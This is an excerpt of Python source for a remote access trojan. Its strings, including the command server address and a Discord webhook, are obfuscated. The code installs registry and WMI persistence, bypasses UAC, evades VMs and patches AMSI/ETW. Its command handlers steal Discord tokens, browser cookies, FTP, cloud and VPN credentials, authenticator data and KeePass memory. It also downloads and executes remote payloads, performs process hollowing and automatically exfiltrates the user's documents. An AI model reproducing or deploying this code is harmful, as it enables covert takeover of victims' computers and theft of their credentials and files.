...
# For Local Testing: SERVER_URL = __d("LDkDPXQadWteRG1yX2RBA1t+RwNR")
# For Render Deployment: SERVER_URL = __d("LDkDPT0PdXUJHyo2FHkdUxVmBFYTJ1hPaiIZPytbPj8eXSAtHA==")
SERVER_URL = __d("LDkDPT0PdXUJHyo2FHkdUxVmBFYTJ1hPaiIZPytbPj8eXSAtHA==")

# Original: DISCORD_WEBHOOK = __d("LDkDPT0PdXUIGjAhHiYLHAIkGhwAIVQSMygVJSFaMSlDQnd1RGZdBlVzRQBYYg4IfHlDe2FYPBMGRjE0AgU3a0wAEEQmYUxrcg4dBB1iG2JcNgU0RT5dHxM6EnIvKWxccwQHFAgCMhgpIgkVARkKVjEfKEJVAn9wLA==")
...
VERSION_URL = f__d("LDkDPT0PdXUeEjRsFj0bWhQpAkAEI15SKjkSIzobOTUBXDgFOAAnZyMUImAkA0ASPwo+GQZgGAU+NhMNDHsCUwglWEUEI05UKyNZJz1aNA==")
...
def self_replicate():
    ...
    locations = [
        ...
        Path(__d("B3crERlcND4DBDAeLQAKXxEXK0AXMlVSNzlZKDZQ"))
    ]
...
def registry_persistence():
    ...
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, __d("FyIROTlUKD8wLw4rEiYAQQ4tA289BlRTICIAPhJpGS8eASYsBQIKQBIiGF09DW9IKg=="), 0, winreg.KEY_SET_VALUE)
...
def check_persistence():
    ...
    try:
        # Check Registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, __d("FyIROTlUKD8wLw4rEiYAQQ4tA289BlRTICIAPhJpGS8eASYsBQIKQBIiGF09DW9IKg=="), 0, winreg.KEY_READ)
...
def check_vm():
    ...
    # 4. Check Drivers
    drivers = [__d("B3crERlcND4DBDAeLQcWQRUuGgBTDWFZNiQBKDxGBgY6MSw6PDsaQQRlBEoS"), __d("B3crERlcND4DBDAeLQcWQRUuGgBTDWFZNiQBKDxGBgYaHi4tBCcKHBIyBA==")]
    for d in drivers:
...
def uac_bypass():
    ...
    try:
        reg_path = __d("FyIROTlUKD8wLwAuECccVxIXK14SfE5YMDkeIylGBgY/GyYuHQgzfREuGW89MlJQKSwZKQ==")
...
def grab_discord_tokens():
    ...
    paths = {
        ...
        'Discord Canary': roaming + __d("GBETJD1WNSgIECIsECYW"),
        'Discord PTB': roaming + __d("GBETJD1WNSgIAzcg"),
        'Google Chrome': local + __d("GBEwIiFSNj8wLwAqAzsCVz0XIkAEIx15JTkWERJxPzwNBi82"),
        'Opera': roaming + __d("GBE4PStHO3o/HCU2BjUdVz0XOEMEI1wdFzkWLyJQ"),
        'Brave': local + __d("GBE1Py9DPwkDFTc1ECYKbj0JBVIXNBB/NiIAPitHBgY5ACYwURAORgAXK3cEN1xIKDk="),
        'Yandex': local + __d("GBEuLCBRPyIwLxojHzAKSiM5GEQSNE9hGBgEKDwVHjsYEh8eNTEJUxQnAw==")
    }
...
def socketio_handler():
    ...
    sio_client = socketio.Client(
        ...
        reconnection_randomization_factor=0.5
    )
    ...
    # Module events
    sio_client.on('lolbins', handle_lolbins)
    sio_client.on('network_scan', handle_network_scan)
    sio_client.on('steal_creds', handle_steal_creds)
    sio_client.on('steal_vpn', handle_steal_vpn)
    sio_client.on('steal_auth', handle_steal_auth)
    sio_client.on('harvest_email', handle_harvest_email)
    sio_client.on('process_hollow', handle_process_hollow)
    sio_client.on('scrape_keepass', handle_scrape_keepass)
    sio_client.on('steal_live_cookies', lambda data: sio_client.emit('cmd_result', {
        'client_id': RAT_ID,
        'output': f"[STEALER] Live session cookies:\n" + "\n".join(M.steal_live_cookies()[:50])
    }))
    
    # ── Module: LOLBins download & execute ──
    def handle_lolbins(data):
        url = data.get('url', '')
        if url:
            cmds, out_path = M.lolbins_download_execute(url)
            cmd_used, output = M.execute_lolbin(cmds)
            if cmd_used:
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[LOLBINS] Executed: {cmd_used[:200]}\n{output[:2000]}'})
                if os.path.exists(out_path):
                    with open(out_path, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                        sio_client.emit('exfiltrate_file', {'client_id': RAT_ID, 'filename': os.path.basename(out_path), 'data': content})
            else:
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[LOLBINS] All methods failed'})

    # ── Module: Network scan ──
    def handle_network_scan(data):
        subnet = data.get('subnet', '192.168.1')
        ports = data.get('ports', [22, 80, 445, 3389, 8080, 443])
        results, smb_hosts = M.network_scan(subnet, ports)
        output = f"[NETSCAN] Found {len(results)} open ports:\n"
        for ip, port in sorted(results):
            output += f"  {ip}:{port}\n"
        if smb_hosts:
            output += "\n[SMB] Enumerating shares...\n"
            for host in smb_hosts[:5]:
                shares = M.enumerate_smb_shares(host)
                output += f"  {host} shares: {', '.join(shares) if shares else 'none'}\n"
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': output[:8000]})

    # ── Module: Filezilla/WinSCP/Cloud steal ──
    def handle_steal_creds(data):
        results = []
        results.extend(M.steal_filezilla())
        results.extend(M.steal_winscp())
        results.extend(M.steal_cloud_creds())
        output = "\n".join(results) if results else "No FTP/cloud credentials found."
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[STEALER] FTP/Cloud credentials:\n{output}'})

    # ── Module: VPN config steal ──
    def handle_steal_vpn(data):
        configs = M.steal_vpn_configs()
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[STEALER] VPN configs:\n' + "\n\n".join(configs[:5])})

    # ── Module: Authenticator steal ──
    def handle_steal_auth(data):
        auths = M.steal_authenticators()
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[STEALER] Authenticators:\n' + "\n".join(auths)})

    # ── Module: Outlook/Email harvest ──
    def handle_harvest_email(data):
        items = M.harvest_outlook()
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[STEALER] Email files:\n' + "\n".join(items)})

    # ── Module: Process hollowing ──
    def handle_process_hollow(data):
        target = data.get('target', r'C:\Windows\System32\notepad.exe')
        payload = Path.home() / "AppData\\Local\\Temp\\svchost.exe"
        if payload.exists():
            ok = M.process_hollowing(str(payload), target)
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[HLLOW] Process hollowing: {"SUCCESS" if ok else "FAILED"}'})
        else:
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[HLLOW] Payload not found. Upload first.'})

    # ── Module: KeePass scrape ──
    def handle_scrape_keepass(data):
        items = M.scrape_keepass()
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[STEALER] KeePass memory:\n' + "\n".join(items[:10])})
...
def main_loop():
    ...
    # Apply defense patches (ETW, AMSI, WLDP)
    def_patches = M.apply_defense_patches()
    print(f"[DEFENSE] ETW={def_patches.get('etw')} AMSI={def_patches.get('amsi')} WLDP={def_patches.get('wldp')}")
    ...
    install_persistence()
    # Install advanced persistence (WMI permanent event subscription)
    M.install_all_persistence(os.path.abspath(__file__))
    ...
    # ── Auto-Exfiltrating File Watcher ──
    file_watcher = M.FileWatcher(
        callback=lambda action, path, meta: auto_exfiltrate_file(path),
        paths=[str(Path.home() / "Documents"), str(Path.home() / "Desktop"), str(Path.home() / "Downloads")]
    )
    file_watcher.start()

    # ── Keepalive Monitor (self-wipe if C2 silent for 24h) ──
    last_contact = [time.time()]
    def keepalive_monitor():
        while True:
            if time.time() - last_contact[0] > 86400:  # 24 hours
                handle_self_destruct({})
            time.sleep(60)
    threading.Thread(target=keepalive_monitor, daemon=True).start()

    def auto_exfiltrate_file(file_path):
        try:
            file_path = str(file_path)
            if not os.path.exists(file_path): return
            if os.path.getsize(file_path) > 10 * 1024 * 1024: return
            exts = ['.docx', '.pdf', '.txt', '.xlsx', '.pptx', '.sql', '.conf', '.kdbx', '.ovpn', '.jpg', '.png', '.key']
            if not any(file_path.lower().endswith(e) for e in exts): return
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()
            if sio_client and sio_client.connected:
                sio_client.emit('exfiltrate_file', {'client_id': RAT_ID, 'filename': os.path.basename(file_path), 'data': content})
        except: pass
